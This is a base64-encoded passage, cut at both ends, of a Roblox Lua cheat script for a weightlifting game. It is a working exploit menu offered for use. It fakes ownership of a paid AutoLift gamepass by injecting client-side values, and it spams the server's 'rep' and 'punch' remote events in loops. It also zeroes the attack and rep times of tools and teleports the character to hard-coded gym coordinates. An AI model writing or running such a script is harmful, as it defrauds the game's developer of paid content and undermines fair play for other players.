ZXRzIikKICAgIGVsc2UKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuckV2ZW50cy5zaG93UGV0c0V2ZW50OkZpcmVTZXJ2ZXIoInNob3dQZXRzIikKICAgIGVuZAplbmQpCgoKLS0gRnJlZSBBdXRvTGlmdCBHYW1lcGFzcyBCdXR0b24KZmFybVBsdXNUYWI6QWRkQnV0dG9uKCJVbmxvY2sgQXV0b0xpZnQgR2FtZXBhc3MiLCBmdW5jdGlvbigpCiAgICBsb2NhbCBnYW1lcGFzc0ZvbGRlciA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5nYW1lcGFzc0lkcwogICAgbG9jYWwgcGxheWVyID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIKICAgIGZvciBfLCBnYW1lcGFzcyBpbiBwYWlycyhnYW1lcGFzc0ZvbGRlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGxvY2FsIHZhbHVlID0gSW5zdGFuY2UubmV3KCJJbnRWYWx1ZSIpCiAgICAgICAgdmFsdWUuTmFtZSA9IGdhbWVwYXNzLk5hbWUKICAgICAgICB2YWx1ZS5WYWx1ZSA9IGdhbWVwYXNzLlZhbHVlCiAgICAgICAgdmFsdWUuUGFyZW50ID0gcGxheWVyLm93bmVkR2FtZXBhc3NlcwogICAgZW5kCmVuZCwgIlVubG9jayB0aGUgQXV0b0xpZnQgR2FtZSBQYXNzIGZvciBmcmVlIikKbG9jYWwgYXV0b0VxdWlwVG9vbHNGb2xkZXIgPSBmYXJtUGx1c1RhYjpBZGRGb2xkZXIoIkF1dG8gRXF1aXAgVG9vbHMiKQoKLS0gQXV0byBXZWlnaHQgVG9nZ2xlCmF1dG9FcXVpcFRvb2xzRm9sZGVyOkFkZFN3aXRjaCgiQXV0byBXZWlnaHQiLCBmdW5jdGlvbihWYWx1ZSkKICAgIF9HLkF1dG9XZWlnaHQgPSBWYWx1ZQogICAgCiAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgbG9jYWwgd2VpZ2h0VG9vbCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiV2VpZ2h0IikKICAgICAgICBpZiB3ZWlnaHRUb29sIHRoZW4KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2wod2VpZ2h0VG9vbCkKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgZXF1aXBwZWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIldlaWdodCIpCiAgICAgICAgaWYgZXF1aXBwZWQgdGhlbgogICAgICAgICAgICBlcXVpcHBlZC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBfRy5BdXRvV2VpZ2h0IGRvCiAgICAgICAgICAgIGlmIG5vdCBfRy5BdXRvV2VpZ2h0IHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCwgIkRvIGxpZnRpbmcgYXV0b21hdGljYWxseSIpCgotLSBBdXRvIFB1c2h1cHMgVG9nZ2xlCmF1dG9FcXVpcFRvb2xzRm9sZGVyOkFkZFN3aXRjaCgiQXV0byBQdXNodXBzIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBfRy5BdXRvUHVzaHVwcyA9IFZhbHVlCiAgICAKICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICBsb2NhbCBwdXNodXBzVG9vbCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVzaHVwcyIpCiAgICAgICAgaWYgcHVzaHVwc1Rvb2wgdGhlbgogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkOkVxdWlwVG9vbChwdXNodXBzVG9vbCkKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgZXF1aXBwZWQgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1c2h1cHMiKQogICAgICAgIGlmIGVxdWlwcGVkIHRoZW4KICAgICAgICAgICAgZXF1aXBwZWQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgX0cuQXV0b1B1c2h1cHMgZG8KICAgICAgICAgICAgaWYgbm90IF9HLkF1dG9QdXNodXBzIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInJlcCIpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgZW5kCiAgICBlbmQpCmVuZCwgIkRvIHB1c2gtdXBzIGF1dG9tYXRpY2FsbHkiKQoKLS0gQXV0byBIYW5kc3RhbmRzIFRvZ2dsZQphdXRvRXF1aXBUb29sc0ZvbGRlcjpBZGRTd2l0Y2goIkF1dG8gSGFuZHN0YW5kcyIsIGZ1bmN0aW9uKFZhbHVlKQogICAgX0cuQXV0b0hhbmRzdGFuZHMgPSBWYWx1ZQogICAgCiAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgbG9jYWwgaGFuZHN0YW5kc1Rvb2wgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIkhhbmRzdGFuZHMiKQogICAgICAgIGlmIGhhbmRzdGFuZHNUb29sIHRoZW4KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZDpFcXVpcFRvb2woaGFuZHN0YW5kc1Rvb2wpCiAgICAgICAgZW5kCiAgICBlbHNlCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIGVxdWlwcGVkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIYW5kc3RhbmRzIikKICAgICAgICBpZiBlcXVpcHBlZCB0aGVuCiAgICAgICAgICAgIGVxdWlwcGVkLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIF9HLkF1dG9IYW5kc3RhbmRzIGRvCiAgICAgICAgICAgIGlmIG5vdCBfRy5BdXRvSGFuZHN0YW5kcyB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIGVuZAogICAgZW5kKQplbmQsICJEbyBoYW5kLXN0YW5kcyBhdXRvbWF0aWNhbGx5IikKCi0tIEF1dG8gU2l0dXBzIFRvZ2dsZQphdXRvRXF1aXBUb29sc0ZvbGRlcjpBZGRTd2l0Y2goIkF1dG8gU2l0dXBzIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBfRy5BdXRvU2l0dXBzID0gVmFsdWUKICAgIAogICAgaWYgVmFsdWUgdGhlbgogICAgICAgIGxvY2FsIHNpdHVwc1Rvb2wgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlNpdHVwcyIpCiAgICAgICAgaWYgc2l0dXBzVG9vbCB0aGVuCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQ6RXF1aXBUb29sKHNpdHVwc1Rvb2wpCiAgICAgICAgZW5kCiAgICBlbHNlCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIGVxdWlwcGVkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJTaXR1cHMiKQogICAgICAgIGlmIGVxdWlwcGVkIHRoZW4KICAgICAgICAgICAgZXF1aXBwZWQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgX0cuQXV0b1NpdHVwcyBkbwogICAgICAgICAgICBpZiBub3QgX0cuQXV0b1NpdHVwcyB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIGVuZAogICAgZW5kKQplbmQsICJEbyBzaXQtdXBzIGF1dG9tYXRpY2FsbHkiKQoKLS0gQXV0byBQdW5jaCBUb2dnbGUKYXV0b0VxdWlwVG9vbHNGb2xkZXI6QWRkU3dpdGNoKCJBdXRvIFB1bmNoIiwgZnVuY3Rpb24oVmFsdWUpCiAgICBfRy5mYXN0SGl0QWN0aXZlID0gVmFsdWUKICAgIAogICAgaWYgVmFsdWUgdGhlbgogICAgICAgIC0tIEZ1bmN0aW9uIHRvIGVxdWlwIGFuZCBtb2RpZnkgcHVuY2gKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgX0cuZmFzdEhpdEFjdGl2ZSBkbwogICAgICAgICAgICAgICAgaWYgbm90IF9HLmZhc3RIaXRBY3RpdmUgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaCA9IHBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgICAgICAgICAgaWYgcHVuY2ggdGhlbgogICAgICAgICAgICAgICAgICAgIHB1bmNoLlBhcmVudCA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaDpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcHVuY2guYXR0YWNrVGltZS5WYWx1ZSA9IDAKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgICAgIAogICAgICAgIC0tIEZ1bmN0aW9uIGZvciByYXBpZCBwdW5jaGluZwogICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICB3aGlsZSBfRy5mYXN0SGl0QWN0aXZlIGRvCiAgICAgICAgICAgICAgICBpZiBub3QgX0cuZmFzdEhpdEFjdGl2ZSB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgICAgIHBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJwdW5jaCIsICJyaWdodEhhbmQiKQogICAgICAgICAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICAgICAgICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBwdW5jaFRvb2w6QWN0aXZhdGUoKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZWxzZQogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCBlcXVpcHBlZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgIGlmIGVxdWlwcGVkIHRoZW4KICAgICAgICAgICAgZXF1aXBwZWQuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZW5kCiAgICBlbmQKZW5kLCAiSGl0cyBhdXRvbWF0aWNhbGx5IikKCi0tIEZhc3QgVG9vbHMgVG9nZ2xlCmF1dG9FcXVpcFRvb2xzRm9sZGVyOkFkZFN3aXRjaCgiRmFzdCBUb29scyIsIGZ1bmN0aW9uKFZhbHVlKQogICAgX0cuRmFzdFRvb2xzID0gVmFsdWUKICAgIAogICAgbG9jYWwgZGVmYXVsdFNwZWVkcyA9IHsKICAgICAgICB7CiAgICAgICAgICAgICJQdW5jaCIsCiAgICAgICAgICAgICJhdHRhY2tUaW1lIiwKICAgICAgICAgICAgVmFsdWUgYW5kIDAgb3IgMC4zNQogICAgICAgIH0sCiAgICAgICAgewogICAgICAgICAgICAiR3JvdW5kIFNsYW0iLAogICAgICAgICAgICAiYXR0YWNrVGltZSIsCiAgICAgICAgICAgIFZhbHVlIGFuZCAwIG9yIDYKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgIlN0b21wIiwKICAgICAgICAgICAgImF0dGFja1RpbWUiLAogICAgICAgICAgICBWYWx1ZSBhbmQgMCBvciA3CiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgICJIYW5kc3RhbmRzIiwKICAgICAgICAgICAgInJlcFRpbWUiLAogICAgICAgICAgICBWYWx1ZSBhbmQgMCBvciAxCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgICJQdXNodXBzIiwKICAgICAgICAgICAgInJlcFRpbWUiLAogICAgICAgICAgICBWYWx1ZSBhbmQgMCBvciAxCiAgICAgICAgfSwKICAgICAgICB7CiAgICAgICAgICAgICJXZWlnaHQiLAogICAgICAgICAgICAicmVwVGltZSIsCiAgICAgICAgICAgIFZhbHVlIGFuZCAwIG9yIDEKICAgICAgICB9LAogICAgICAgIHsKICAgICAgICAgICAgIlNpdHVwcyIsCiAgICAgICAgICAgICJyZXBUaW1lIiwKICAgICAgICAgICAgVmFsdWUgYW5kIDAgb3IgMQogICAgICAgIH0KICAgIH0KICAgIAogICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICBsb2NhbCBiYWNrcGFjayA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIkJhY2twYWNrIikKICAgIAogICAgZm9yIF8sIHRvb2xJbmZvIGluIGlwYWlycyhkZWZhdWx0U3BlZWRzKSBkbwogICAgICAgIGxvY2FsIHRvb2wgPSBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZCh0b29sSW5mb1sxXSkKICAgICAgICBpZiB0b29sIGFuZCB0b29sOkZpbmRGaXJzdENoaWxkKHRvb2xJbmZvWzJdKSB0aGVuCiAgICAgICAgICAgIHRvb2xbdG9vbEluZm9bMl1dLlZhbHVlID0gdG9vbEluZm9bM10KICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBsb2NhbCBlcXVpcHBlZFRvb2wgPSBwbGF5ZXIuQ2hhcmFjdGVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xJbmZvWzFdKQogICAgICAgIGlmIGVxdWlwcGVkVG9vbCBhbmQgZXF1aXBwZWRUb29sOkZpbmRGaXJzdENoaWxkKHRvb2xJbmZvWzJdKSB0aGVuCiAgICAgICAgICAgIGVxdWlwcGVkVG9vbFt0b29sSW5mb1syXV0uVmFsdWUgPSB0b29sSW5mb1szXQogICAgICAgIGVuZAogICAgZW5kCmVuZCwgIkFjY2VsZXJhdGVzIGFsbCB0b29scyIpCgotLSBJbmljaWFsaXphciB2YXJpYWJsZXMgZGUgc2VndWltaWVudG8KbG9jYWwgc2Vzc2lvblN0YXJ0VGltZSA9IG9zLnRpbWUoKQpsb2NhbCBzZXNzaW9uU3RhcnRTdHJlbmd0aCA9IDAKbG9jYWwgc2Vzc2lvblN0YXJ0RHVyYWJpbGl0eSA9IDAKbG9jYWwgc2Vzc2lvblN0YXJ0S2lsbHMgPSAwCmxvY2FsIHNlc3Npb25TdGFydFJlYmlydGhzID0gMApsb2NhbCBzZXNzaW9uU3RhcnRCcmF3bHMgPSAwCmxvY2FsIGhhc1N0YXJ0ZWRUcmFja2luZyA9IGZhbHNlCgpsb2NhbCBqdW5nbGVHeW1Gb2xkZXIgPSBmYXJtUGx1c1RhYjpBZGRGb2xkZXIoIkp1bmdsZSBHeW0iKQoKLS0gQ2FjaGUgc2VydmljZXMgZm9yIGZhc3RlciBhY2Nlc3MKbG9jYWwgVklNID0gZ2FtZTpHZXRTZXJ2aWNlKCJWaXJ0dWFsSW5wdXRNYW5hZ2VyIikKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKLS0gSGVscGVyIGZ1bmN0aW9ucyBmb3IgSnVuZ2xlIEd5bQpsb2NhbCBmdW5jdGlvbiBwcmVzc0UoKQogICAgVklNOlNlbmRLZXlFdmVudCh0cnVlLCAiRSIsIGZhbHNlLCBnYW1lKQogICAgdGFzay53YWl0KDAuMSkKICAgIFZJTTpTZW5kS2V5RXZlbnQoZmFsc2UsICJFIiwgZmFsc2UsIGdhbWUpCmVuZAoKbG9jYWwgZnVuY3Rpb24gYXV0b0xpZnQoKQogICAgd2hpbGUgZ2V0Z2VudigpLndvcmtpbmcgZG8KICAgICAgICBMb2NhbFBsYXllci5tdXNjbGVFdmVudDpGaXJlU2VydmVyKCJyZXAiKQogICAgICAgIHRhc2sud2FpdCgpIC0tIE1vcmUgZWZmaWNpZW50IHRoYW4gdGFzay53YWl0KDApIG9yIHRhc2sud2FpdChzbWFsbCBudW1iZXIpCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiB0ZWxlcG9ydEFuZFN0YXJ0KG1hY2hpbmVOYW1lLCBwb3NpdGlvbikKICAgIGxvY2FsIGNoYXJhY3RlciA9IExvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgaWYgY2hhcmFjdGVyIGFuZCBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgY2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gcG9zaXRpb24KICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIHByZXNzRSgpCiAgICAgICAgdGFzay5zcGF3bihhdXRvTGlmdCkgLS0gVXNlIHRhc2suc3Bhd24gdG8gcHJldmVudCBVSSBmcmVlemluZwogICAgZW5kCmVuZAoKLS0gSnVuZ2xlIEd5bSBCZW5jaCBQcmVzcwpqdW5nbGVHeW1Gb2xkZXI6QWRkU3dpdGNoKCJKdW5nbGUgQmVuY2ggUHJlc3MiLCBmdW5jdGlvbihib29sKQogICAgaWYgZ2V0Z2VudigpLndvcmtpbmcgYW5kIG5vdCBib29sIHRoZW4KICAgICAgICBnZXRnZW52KCkud29ya2luZyA9IGZhbHNlCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIAogICAgZ2V0Z2VudigpLndvcmtpbmcgPSBib29sCiAgICBpZiBib29sIHRoZW4KICAgICAgICB0ZWxlcG9ydEFuZFN0YXJ0KCJCZW5jaCBQcmVzcyIsIENGcmFtZS5uZXcoLTgxNzMsIDY0LCAxODk4KSkKICAgIGVuZAplbmQpCgotLSBKdW5nbGUgR3ltIFNxdWF0Cmp1bmdsZUd5bUZvbGRlcjpBZGRTd2l0Y2goIkp1bmdsZSBTcXVhdCIsIGZ1bmN0aW9uKGJvb2wpCiAgICBpZiBnZXRnZW52KCkud29ya2luZyBhbmQgbm90IGJvb2wgdGhlbgogICAgICAgIGdldGdlbnYoKS53b3JraW5nID0gZmFsc2UKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgCiAgICBnZXRnZW52KCkud29ya2luZyA9IGJvb2wKICAgIGlmIGJvb2wgdGhlbgogICAgICAgIHRlbGVwb3J0QW5kU3RhcnQoIlNxdWF0IiwgQ0ZyYW1lLm5ldygtODM1MiwgMzQsIDI4NzgpKQogICAgZW5kCmVuZCkKCi0tIEp1bmdsZSBHeW0gUHVsbCBVcApqdW5nbGVHeW1Gb2xkZXI6QWRkU3dpdGNoKCJKdW5nbGUgUHVsbCBVcHMiLCBmdW5jdGlvbihib29sKQogICAgaWYgZ2V0Z2VudigpLndvcmtpbmcgYW5kIG5vdCBib29sIHRoZW4KICAgICAgICBnZXRnZW52KCkud29ya2luZyA9IGZhbHNlCiAgICAgICAgcmV0dXJuCiAgICBlbmQKICAgIAogICAgZ2V0Z2VudigpLndvcmtpbmcgPSBib29sCiAgICBpZiBib29sIHRoZW4KICAgICAgICB0ZWxlcG9ydEFuZFN0YXJ0KCJQdWxsIFVwIiwgQ0ZyYW1lLm5ldygtODY2NiwgMzQsIDIwNzApKQogICAgZW5kCmVuZCkKCi0tIEp1bmdsZSBHeW0gQm91bGRlcgpqdW5nbGVHeW1Gb2xkZXI6QWRkU3dpdGNoKCJKdW5nbGUgQm91bGRlciIsIGZ1bmN0aW9uKGJvb2wpCiAgICBpZiBnZXRnZW52KCkud29ya2luZyBhbmQgbm90IGJvb2wgdGhlbgogICAgICAgIGdldGdlbnYoKS53b3JraW5nID0gZmFsc2UKICAgICAgICByZXR1cm4KICAgIGVuZAogICAgCiAgICBnZXRnZW52KCkud29ya2luZyA9IGJvb2wKICAgIGlmIGJvb2wgdGhlbgogICAgICAgIHRlbGVwb3J0QW5kU3RhcnQoIkJvdWxkZXIiLCBDRnJhbWUubmV3KC04NjIxLCAzNCwgMjY4NCkpCiAgICBlbmQKZW5kKQoKLS0gTkVXOiBGYXJtIEd5bXMgRm9sZGVyCmxvY2FsIGZhcm1HeW1zRm9sZGVyID0gZmFybVBsdXNUYWI6QWRkRm9sZGVyKCJHeW0gV29ya291dHMiKQoKLS0gV29ya291dCBwb3NpdGlvbnMgZGF0YQpsb2NhbCB3b3Jrb3V0UG9zaXRpb25zID0gewogICAgWyJCZW5jaCBQcmVzcyJdID0gewogICAgICAgIFsiRXRlcm5hbCBHeW0iXSA9IENGcmFtZS5uZXcoLTcxNzYuMTkxNDEsIDQ1LjM5NDEwNCwgLTExMDYuMzE0MjEpLAogICAgICAgIFsiTGVnZW5kIEd5bSJdID0gQ0ZyYW1lLm5ldyg0MTExLjkxNzQ4LCAxMDIwLjQ2Njc0LCAtMzc5OS45NzIxNyksCiAgICAgICAgWyJNdXNjbGUgS2luZyBHeW0iXSA9IENGcmFtZS5uZXcoLTg1OTAuMDYxNTIsIDQ2LjAxNjc0MjcsIC02MDQzLjM0NzE3KQogICAgfSwKICAgIFsiU3F1YXQiXSA9IHsKICAgICAgICBbIkV0ZXJuYWwgR3ltIl0gPSBDRnJhbWUubmV3KC03MTc2LjE5MTQxLCA0NS4zOTQxMDQsIC0xMTA2LjMxNDIxKSwKICAgICAgICBbIkxlZ2VuZCBHeW0iXSA9IENGcmFtZS5uZXcoNDMwNC45OTAyMywgOTg3LjgyOTk1NiwgLTQxMjQuMjMzNCksCiAgICAgICAgWyJNdXNjbGUgS2luZyBHeW0iXSA9IENGcmFtZS5uZXcoLTg5NDAuMTI0MDIsIDEzLjE2NDIwODQsIC01Njk5LjEzNDc3KQogICAgfSwKICAgIFsiRGVhZGxpZnQiXSA9IHsKICAgICAgICBbIkV0ZXJuYWwgR3ltIl0gPSBDRnJhbWUubmV3KC03MTc2LjE5MTQxLCA0NS4zOTQxMDQsIC0xMTA2LjMxNDIxKSwKICAgICAgICBbIkxlZ2VuZCBHeW0iXSA9IENGcmFtZS5uZXcoNDMwNC45OTAyMywgOTg3LjgyOTk1NiwgLTQxMjQuMjMzNCksCiAgICAgICAgWyJNdXNjbGUgS2luZyBHeW0iXSA9IENGcmFtZS5uZXcoLTg5NDAuMTI0MDIsIDEzLjE2NDIwODQsIC01Njk5LjEzNDc3KQogICAgfSwKICAgIFsiUHVsbCBVcCJdID0gewogICAgICAgIFsiRXRlcm5hbCBHeW0iXSA9IENGcmFtZS5uZXcoLTcxNzYuMTkxNDEsIDQ1LjM5NDEwNCwgLTExMDYuMzE0MjEpLAogICAgICAgIFsiTGVnZW5kIEd5bSJdID0gQ0ZyYW1lLm5ldyg0MzA0Ljk5MDIzLCA5ODcuODI5OTU2LCAtNDEyNC4yMzM0KSwKICAgICAgICBbIk11c2NsZSBLaW5nIEd5bSJdID0gQ0ZyYW1lLm5ldygtODk0MC4xMjQwMiwgMTMuMTY0MjA4NCwgLTU2OTkuMTM0NzcpCiAgICB9Cn0KCi0tIFdvcmtvdXQgdHlwZXMKbG9jYWwgd29ya291dFR5cGVzID0gewogICAgIkJlbmNoIFByZXNzIiwKICAgICJTcXVhdCIsCiAgICAiRGVhZGxpZnQiLAogICAgIlB1bGwgVXAiCn0KCi0tIEd5bSBsb2NhdGlvbnMgKG9ubHkgdGhlIHRocmVlIHJlcXVlc3RlZCkKbG9jYWwgZ3ltTG9jYXRpb25zID0gewogICAgIkV0ZXJuYWwgR3ltIiwKICAgICJMZWdlbmQgR3ltIiwKICAgICJNdXNjbGUgS2luZyBHeW0iCn0KCi0tIFNwYW5pc2ggdHJhbnNsYXRpb25zIGZvciB3b3Jrb3V0IHR5cGVzCmxvY2FsIHdvcmtvdXRUcmFuc2xhdGlvbnMgPSB7CiAgICBbIkJlbmNoIFByZXNzIl0gPSAiQmVuY2ggUHJlc3MiLAogICAgWyJTcXVhdCJdID0gIlNxdWF0IiwKICAgIFsiRGVhZGxpZnQiXSA9ICJEZWFkIExpZnQiLAogICAgWyJQdWxsIFVwIl0gPSAiUHVsbCBVcCIKfQoKLS0gU3RvcmUgcmVmZXJlbmNlcyB0byB0b2dnbGUgb2JqZWN0cwpsb2NhbCBneW1Ub2dnbGVzID0ge30KCi0tIENyZWF0ZSBkcm9wZG93bnMgYW5kIHRvZ2dsZXMgZm9yIGVhY2ggd29ya291dCB0eXBlCmZvciBfLCB3b3Jrb3V0VHlwZSBpbiBpcGFpcnMod29ya291dFR5cGVzKSBkbwogICAgLS0gQ3JlYXRlIGRyb3Bkb3duIGZvciBneW0gc2VsZWN0aW9uCiAgICBsb2NhbCBkcm9wZG93bk5hbWUgPSB3b3Jrb3V0VHlwZSAuLiAiR3ltRHJvcGRvd24iCiAgICBsb2NhbCBzcGFuaXNoV29ya291dE5hbWUgPSB3b3Jrb3V0VHJhbnNsYXRpb25zW3dvcmtvdXRUeXBlXQogICAgCiAgICAtLSBDcmVhdGUgdGhlIGRyb3Bkb3duIHdpdGggdGhlIGNvcnJlY3QgZm9ybWF0CiAgICBsb2NhbCBkcm9wZG93biA9IGZhcm1HeW1zRm9sZGVyOkFkZERyb3Bkb3duKHNwYW5pc2hXb3Jrb3V0TmFtZSAuLiAiIC0gR3ltIiwgZnVuY3Rpb24oc2VsZWN0ZWQpCiAgICAgICAgX0dbInNlbGVjdGVkIiAuLiBzdHJpbmcuZ3N1Yih3b3Jrb3V0VHlwZSwgIiAiLCAiIikgLi4gIkd5bSJdID0gc2VsZWN0ZWQKICAgIGVuZCkKICAgIAogICAgLS0gQWRkIGd5bSBsb2NhdGlvbnMgdG8gdGhlIGRyb3Bkb3duCiAgICBmb3IgXywgZ3ltTmFtZSBpbiBpcGFpcnMoZ3ltTG9jYXRpb25zKSBkbwogICAgICAgIGR